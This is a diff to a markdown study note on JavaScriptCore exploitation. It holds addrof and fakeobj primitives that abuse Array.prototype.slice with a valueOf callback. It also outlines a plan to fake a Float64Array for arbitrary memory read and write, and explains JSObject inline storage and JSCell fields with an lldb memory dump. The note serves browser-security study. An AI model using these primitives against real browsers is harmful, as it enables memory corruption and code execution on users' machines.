@@ -281,17 +281,19 @@ The `fakeobj` primitive works essentially the other way around. Here we inject n
 3. Call `slice()` on the target array the object from step 2 as one of the args.
 ```js
 // both implementations
-var a = []; 
-for (var i = 0; i < 100; i++) {
-	a.push(i + 0.1337); //Array must be of type ArrayWithDoubles
+function addrof(object) {
+	var a = []; 
+	for (var i = 0; i < 100; i++) {
+		a.push(i + 0.1337); //Array must be of type ArrayWithDoubles
 
-	var hax = {valueOf: function() {
-		a.length = 0;
-		a = [object]; 
-		return 4; 
-	}}
-	var b = a.slice(0, hax);
-	return Int64.fromDouble(b[3]);
+		var hax = {valueOf: function() {
+			a.length = 0;
+			a = [object]; 
+			return 4; 
+		}}
+		var b = a.slice(0, hax);
+		return Int64.fromDouble(b[3]);
+	}
 }
 
 function fakeobj(addr) {
@@ -307,3 +309,52 @@ function fakeobj(addr) {
 	return a.slice(0, hax)[3];
 }
 ```
+
+# Plan of eplxoitation
+From here on our goal will be to obtain an arbitrary memory read/write primitive through a fake JS object. We are faced with the following:
+- What kind of object do we want to fake?
+- How do we fake such an object
+- When do we place the faked object so that we know its address?
+
+For a while now, JS engines have supported typed arrays, and effienct and higly optimizable storage for raw binary data. These turn out to be good condidates for our fake object as they are mutable and this controlling their data pointer yields an arbitrary read/write primitive usable from script. Ultimately our goal will now be to fake a `Float64Array` instance.
+
+We will now turn to Q2 and Q3, which require another discussion of JSC internals, namely the JSObject stystem.
+
+# Understanding the JSObject system
+
+JS objects are implemented in JSC by a combination of `C++` classes. At the center lies the JSObject class which is itself a JSCell. There are various subclasses JSObject that loosely resemble different JS objects, such as `Array`, `Typed arrays`, or `Proxys`.
+
+We will noe explore the different parts that make up JSObjects inside the JSC engine. 
+
+# Property storage
+Properties are the most important aspect of JS objects. We have already seem how properties are stored in the engine: the butterfly. But that is only half the truth. Besides the butterfly, JSObjects can also have inline storage(6 slots by default, but subject to runtime analysis), located right after the object in memory. This can result in a slight performance gain if no butterfly ever needs to be allocated for an object.
+
+The inline storage is interesting to us since we can leak the address of an object, and thus know the address of its inline slots. These make up a good candidate to put place our fake object in. As added bonus, going this way we also avoid any problem that might arise when placing an objexct outside of a marked block as previously discusses. This answers Q3
+
+# JSObject internals
+We will start with an example: suppose we run the following piece of JS code:
+```js
+// suppose we run the following
+obj = {'a': 0x1337, 'b': false, 'c': 13.37, 'd': [1,2,3,4]};
+/*
+    (lldb) x/6gx 0x10cd97c10
+    0x10cd97c10: 0x0100150000000136 0x0000000000000000
+    0x10cd97c20: 0xffff000000001337 0x0000000000000006
+    0x10cd97c30: 0x402bbd70a3d70a3d 0x000000010cdc7e10
+*/
+```
+The first quadword is the JSCell. The second one the `Butterfly` pointer, which is null since all properties are stored inline. Next are the inline JSValues slots fore the 4 properties: and int, false, a double, and a JSObject pointer. If we were to add more props to the obj, a butterfly would at some point be allocated to store these.
+
+What does a JSCell contain? JSCell.h revelas:
+
+- `StructureID m_structureID;`
+	- This si the most interesting one.
+- `IndexingType m_indexingType;`
+	- We have already seen this before. It indicates the storage mode of the object elements.
+- `JStype m_type;`
+	- Stores the type of this cell: string, symbol, function, plain obj...
+- `TypeInfo::InlineTypeFlags m_flags`;
+	- Flags that are not too important for our purposes. `JSTypeInfo.h` contains further info
+- `CellState m_cellstate`;
+	- We have also seen this before. IT is used by the garbage collector during collection.
+
